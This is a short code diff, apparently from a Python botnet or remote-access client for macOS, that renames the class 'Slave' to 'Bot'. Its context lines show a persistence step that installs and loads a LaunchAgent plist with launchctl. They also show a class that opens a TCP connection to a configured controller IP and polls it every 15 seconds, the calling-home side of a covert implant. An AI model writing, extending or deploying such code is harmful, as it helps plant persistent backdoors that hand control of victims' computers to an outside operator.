@@ -40,7 +40,7 @@ chmod 600 ~/Library/LaunchAgents/${LABEL}.plist
 launchctl load ~/Library/LaunchAgents/${LABEL}.plist
 exit""")
 
-class Slave:
+class Bot:
     def __init__(self, controller_ip=CONTROLLER_IP, port=PORT, interval_sec=15):
         self.controller_ip = controller_ip 
         self.port = port
@@ -393,4 +393,4 @@ class Slave:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.est_connection()
 
-slave = Slave()
+bot = Bot()
